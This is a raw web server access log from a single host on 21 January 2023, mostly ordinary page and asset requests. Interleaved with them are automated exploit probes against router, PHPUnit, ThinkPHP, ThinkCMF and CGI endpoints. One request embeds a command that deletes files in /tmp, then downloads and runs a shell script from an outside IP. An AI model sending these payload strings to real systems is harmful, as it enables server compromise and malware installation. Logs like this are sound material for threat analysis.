45.14.71.23 - - [21/Jan/2023:11:24:49 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:24:51 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:25:08 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:25:08 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:26:38 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:26:39 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:26:48 +0000] "GET /favicon.ico HTTP/1.1" 403 495 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:42:05 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:42:06 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
205.185.118.237 - - [21/Jan/2023:11:44:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 403 495 "http://23.111.202.27:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.14.71.23 - - [21/Jan/2023:11:47:37 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:47:38 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:48:05 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:11:48:05 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.224.128.224 - - [21/Jan/2023:12:00:52 +0000] "GET / HTTP/1.1" 403 458 "-" "libwww-perl/6.67"
45.14.71.23 - - [21/Jan/2023:12:14:04 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:12:14:06 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
128.1.248.42 - - [21/Jan/2023:12:14:49 +0000] "GET / HTTP/1.1" 403 439 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:12:16:04 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:12:16:04 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
193.32.162.159 - - [21/Jan/2023:12:27:36 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.14.71.23 - - [21/Jan/2023:12:34:46 +0000] "GET /favicon.ico HTTP/1.1" 403 495 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:12:34:47 +0000] "GET / HTTP/1.1" 403 494 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:12:34:48 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
193.35.18.189 - - [21/Jan/2023:12:58:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 403 495 "http://23.111.202.27:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
170.64.145.119 - - [21/Jan/2023:13:38:44 +0000] "GET / HTTP/1.1" 403 439 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.94.145.58 - - [21/Jan/2023:13:51:01 +0000] "GET / HTTP/1.1" 403 439 "-" "-"
167.94.145.58 - - [21/Jan/2023:13:51:01 +0000] "GET / HTTP/1.1" 403 439 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
45.14.71.23 - - [21/Jan/2023:15:20:44 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:20:45 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
152.89.196.211 - - [21/Jan/2023:15:34:18 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:43:55 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:43:57 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:43:59 +0000] "GET / HTTP/1.1" 403 494 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:44:00 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:46:36 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:46:50 +0000] "GET /favicon.ico HTTP/1.1" 403 495 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:15:49:36 +0000] "GET /favicon.ico HTTP/1.1" 403 495 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
92.118.39.82 - - [21/Jan/2023:15:51:01 +0000] "GET / HTTP/1.1" 403 439 "-" "-"
193.32.162.159 - - [21/Jan/2023:15:53:01 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [21/Jan/2023:15:58:25 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
24.151.61.198 - - [21/Jan/2023:16:14:00 +0000] "GET / HTTP/1.1" 403 439 "-" "-"
152.89.196.211 - - [21/Jan/2023:16:18:15 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:24:51 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:24:52 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
152.89.196.211 - - [21/Jan/2023:16:35:34 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:38:19 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:38:20 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:38:20 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:38:21 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:49:44 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:49:46 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
205.185.118.237 - - [21/Jan/2023:16:56:40 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 403 495 "http://23.111.202.27:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.14.71.23 - - [21/Jan/2023:16:57:04 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:57:05 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:16:57:56 +0000] "-" 408 0 "-" "-"
45.14.71.23 - - [21/Jan/2023:16:57:56 +0000] "-" 408 0 "-" "-"
152.89.196.211 - - [21/Jan/2023:16:58:07 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:03:05 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:03:06 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:03:08 +0000] "GET / HTTP/1.1" 403 494 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:03:09 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:03:30 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:03:31 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:03:57 +0000] "-" 408 0 "-" "-"
193.32.162.159 - - [21/Jan/2023:17:05:38 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [21/Jan/2023:17:18:35 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.154.77.190 - - [21/Jan/2023:17:19:46 +0000] "GET / HTTP/1.1" 403 458 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
195.154.77.190 - - [21/Jan/2023:17:20:06 +0000] "GET / HTTP/1.1" 403 458 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
45.14.71.23 - - [21/Jan/2023:17:27:13 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:27:15 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:27:43 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:27:44 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:17:28:05 +0000] "-" 408 0 "-" "-"
152.89.196.211 - - [21/Jan/2023:17:35:27 +0000] "GET /console/ HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.213.58 - - [21/Jan/2023:17:40:22 +0000] "MGLNDD_23.111.202.27_80\n" 400 487 "-" "-"
183.136.225.32 - - [21/Jan/2023:17:45:36 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
152.89.196.211 - - [21/Jan/2023:17:47:58 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
183.136.225.32 - - [21/Jan/2023:17:51:05 +0000] "GET / HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [21/Jan/2023:17:51:06 +0000] "GET /favicon.ico HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [21/Jan/2023:17:51:07 +0000] "GET /robots.txt HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
152.89.196.211 - - [21/Jan/2023:17:58:19 +0000] "GET /_ignition/execute-solution HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [21/Jan/2023:18:07:35 +0000] "GET / HTTP/1.1" 403 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:09:51 +0000] "GET / HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:09:54 +0000] "GET /favicon.ico HTTP/1.1" 403 494 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:10:16 +0000] "GET / HTTP/1.1" 500 802 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:10:17 +0000] "GET /favicon.ico HTTP/1.1" 500 802 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:10:21 +0000] "GET / HTTP/1.1" 500 802 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:10:22 +0000] "GET /favicon.ico HTTP/1.1" 500 802 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:11:13 +0000] "-" 408 0 "-" "-"
152.89.196.211 - - [21/Jan/2023:18:12:51 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:14:47 +0000] "GET / HTTP/1.1" 500 802 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:14:48 +0000] "GET /favicon.ico HTTP/1.1" 500 802 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:15:38 +0000] "-" 408 0 "-" "-"
45.14.71.23 - - [21/Jan/2023:18:20:06 +0000] "GET / HTTP/1.1" 500 802 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:20:07 +0000] "GET /favicon.ico HTTP/1.1" 500 802 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
152.89.196.211 - - [21/Jan/2023:18:20:50 +0000] "GET / HTTP/1.1" 500 802 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.177.242 - - [21/Jan/2023:18:25:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 500 802 "http://23.111.202.27:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
223.83.101.94 - - [21/Jan/2023:18:40:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+5.255.105.71/76d32be0.sh;sh+/tmp/76d32be0.sh HTTP/1.1" 500 798 "-" "Hello, world"
152.89.196.211 - - [21/Jan/2023:18:42:04 +0000] "GET /actuator/gateway/routes HTTP/1.1" 500 802 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:30 +0000] "GET / HTTP/1.1" 500 802 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:31 +0000] "GET /favicon.ico HTTP/1.1" 500 802 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:38 +0000] "GET / HTTP/1.1" 200 3032 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:39 +0000] "GET /static/css/main.css HTTP/1.1" 200 2032 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:39 +0000] "GET /static/css/vendors/prism/prism.css HTTP/1.1" 200 1228 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/css/vendors/swiper/swiper-bundle.min.css HTTP/1.1" 200 4528 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/js/vendors/popper/popper.min.js HTTP/1.1" 200 7570 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/css/theme.min.css HTTP/1.1" 200 43041 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/js/vendors/anchorjs/anchor.min.js HTTP/1.1" 200 2971 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/js/vendors/is/is.min.js HTTP/1.1" 200 4369 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/js/vendors/bootstrap/bootstrap.min.js HTTP/1.1" 200 16713 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/js/vendors/lodash/lodash.min.js HTTP/1.1" 200 26253 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:41 +0000] "GET /static/js/vendors/prism/prism.js HTTP/1.1" 200 17762 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:41 +0000] "GET /static/images/img/logos/Binance_logo.png HTTP/1.1" 200 11567 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:41 +0000] "GET /static/images/banner.webp HTTP/1.1" 200 76551 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:41 +0000] "GET /static/images/logop2p.webp HTTP/1.1" 200 34198 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:41 +0000] "GET /assets/img/hero/hero-bg.png HTTP/1.1" 404 418 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:42 +0000] "GET /static/js/theme.js HTTP/1.1" 200 4978 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
